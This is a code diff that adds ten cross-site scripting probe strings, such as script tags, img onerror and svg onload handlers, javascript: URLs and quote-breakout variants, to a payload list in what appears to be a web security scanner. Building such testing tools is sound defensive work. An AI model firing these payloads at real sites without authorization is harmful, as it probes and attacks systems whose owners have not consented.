@@ -18,7 +18,18 @@ class XSSPayloads:
             '<iframe src="javascript:alert(\'XSS\')">',
             '<body onload=alert("XSS")>',
             '<input onfocus=alert("XSS") autofocus>',
-            '<select onfocus=alert("XSS") autofocus>'
+            '<select onfocus=alert("XSS") autofocus>',
+            # Additional basic payloads for better coverage
+            '<script>alert(1)</script>',
+            '<img src=1 onerror=alert(1)>',
+            '<svg/onload=alert(1)>',
+            'javascript:alert(1)',
+            '"><img src=x onerror=alert(1)>',
+            "'><img src=x onerror=alert(1)>",
+            '<script>confirm(1)</script>',
+            '<img src="" onerror="alert(1)">',
+            '<svg onload="alert(1)">',
+            '<iframe src=javascript:alert(1)>'
         ]
     
     @staticmethod
